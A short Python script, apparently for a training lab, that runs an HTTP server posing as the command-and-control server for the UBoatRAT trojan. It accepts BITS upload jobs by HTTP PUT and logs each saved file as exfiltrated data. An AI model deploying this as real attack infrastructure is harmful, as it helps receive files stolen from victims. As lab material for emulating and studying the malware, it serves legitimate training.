#!/usr/bin/env python3
import os
from http.server import SimpleHTTPRequestHandler, HTTPServer

PORT = 8080

class UBoatC2Handler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        """Support for BITS /upload jobs (HTTP PUT requests)"""
        path = self.translate_path(self.path)
        
        # Ensure the target directory exists
        os.makedirs(os.path.dirname(path), exist_ok=True)
        
        # Retrieve the data from the BITS request
        length = int(self.headers['Content-Length'])
        with open(path, 'wb') as f:
            f.write(self.rfile.read(length))
        
        # BITS requires a 200 or 201 response to acknowledge a successful upload
        self.send_response(201, "Created")
        self.end_headers()
        print(f"[+] Exfiltrated file received via BITS: {self.path}")

if __name__ == '__main__':
    print("[*] Starting C2 server for the UBoatRAT Lab...")
    server = HTTPServer(('0.0.0.0', PORT), UBoatC2Handler)
    print(f"[*] Listening on port {PORT} (GET for /c2/ and PUT for /uploads/)...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped by user.")
        server.server_close()
